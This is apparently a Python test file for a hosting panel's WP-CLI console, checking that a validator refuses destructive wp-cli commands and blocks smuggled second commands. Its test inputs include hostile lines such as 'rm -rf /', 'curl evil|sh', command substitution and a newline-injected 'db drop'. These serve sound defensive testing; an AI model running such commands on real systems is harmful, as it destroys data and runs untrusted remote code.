"""The WP-CLI console — Ploi's WordPress → WP-CLI tab.

wp-cli is how WordPress is actually administered from a server, and a plugin brings its own
commands (`wp woocommerce update`, `wp elementor flush-css`), so no fixed list here could
cover what somebody legitimately needs. The bound is therefore a REFUSAL list plus a shape
that cannot become a second command — an allow-list would make the feature useless.

What is refused is what destroys data with no undo anywhere in this system, and what turns
this into a shell.
"""
import shlex

import pytest

from app.services import wordpress_service as ws


def test_an_ordinary_command_runs():
    assert ws.check_wp_command("plugin list --status=active") == "plugin list --status=active"


def test_a_plugins_own_command_runs():
    """The reason this cannot be an allow-list."""
    assert ws.check_wp_command("woocommerce update") == "woocommerce update"


def test_pasting_the_whole_line_from_a_terminal_works():
    """`wp plugin list` is what people have in their notes. Leaving the `wp` would run
    `wp wp plugin list`, which fails for a reason nobody could guess."""
    assert ws.check_wp_command("wp plugin list") == "plugin list"


def test_typing_only_wp_is_answered_helpfully():
    with pytest.raises(ws.WordPressError) as exc:
        ws.check_wp_command("wp")
    assert "plugin list" in str(exc.value)


@pytest.mark.parametrize("wipes", ["db drop", "db reset", "db query \"x\"", "DB DROP",
                                   "eval phpinfo();", "eval-file x.php", "shell",
                                   "server", "package install evil"])
def test_what_empties_the_database_or_runs_code_is_refused(wipes):
    with pytest.raises(ws.WordPressError):
        ws.check_wp_command(wipes)


def test_the_refusal_says_where_to_go_instead():
    with pytest.raises(ws.WordPressError) as exc:
        ws.check_wp_command("db drop")
    assert "terminal" in str(exc.value)


@pytest.mark.parametrize("attack", [
    "plugin list; rm -rf /", "plugin list && curl evil|sh", "plugin list `id`",
    "plugin list $(id)", "plugin list > /etc/passwd", "plugin list\nwp db drop",
])
def test_a_second_command_cannot_be_smuggled_in(attack):
    with pytest.raises(ws.WordPressError):
        ws.check_wp_command(attack)


def test_a_second_line_is_refused_before_whitespace_is_collapsed():
    """Collapsing first would turn a two-line paste into one command with surprise arguments,
    and the newline check could then never fire — the same trap the artisan console had."""
    with pytest.raises(ws.WordPressError) as exc:
        ws.check_wp_command("plugin list\nplugin deactivate all")
    assert "more than one line" in str(exc.value)


def test_arguments_survive_as_separate_words():
    """Quoting the whole string hands wp-cli one argument literally named
    "plugin list --status=active", which is not a command."""
    line = [l for l in ws.build_wp_command("plugin list --status=active", "/var/www/x")
            .splitlines() if "$WP" in l and "_t " in l][-1]
    # `2>&1` is a redirect, not an argument — shlex sees it as a word, so the
    # command words are the three before it.
    assert shlex.split(line)[-4:-1] == ["plugin", "list", "--status=active"]


def test_the_command_runs_against_this_site_and_as_its_owner():
    """--path is not optional: wp-cli finds an install by walking up from the working
    directory, which here is the SSH login's home."""
    cmd = ws.build_wp_command("plugin list", "/var/www/shop")
    assert "--path=$WP_PATH" in cmd
    assert "$RUNAS" in cmd


def test_wp_clis_own_error_text_reaches_the_customer():
    """Its message names the real problem far better than anything written here — a plugin
    that does not exist, a command that needs an argument."""
    import inspect

    src = inspect.getsource(ws.run_wp)
    assert "2>&1" in ws.build_wp_command("plugin list", "/var/www/x")
    assert "redact_secrets" in src
    assert '"output": text' in src


def test_an_error_line_counts_as_a_failure_even_when_the_exit_code_says_otherwise():
    """wp-cli prints "Error: …" and still exits 0 in places, so a green tick on that output
    would be a lie."""
    import inspect

    src = inspect.getsource(ws.run_wp)
    assert 'startswith("error:")' in src


def test_the_output_is_bounded():
    """`wp post list` on a real site is megabytes."""
    assert 0 < ws.MAX_WP_OUTPUT <= 200_000
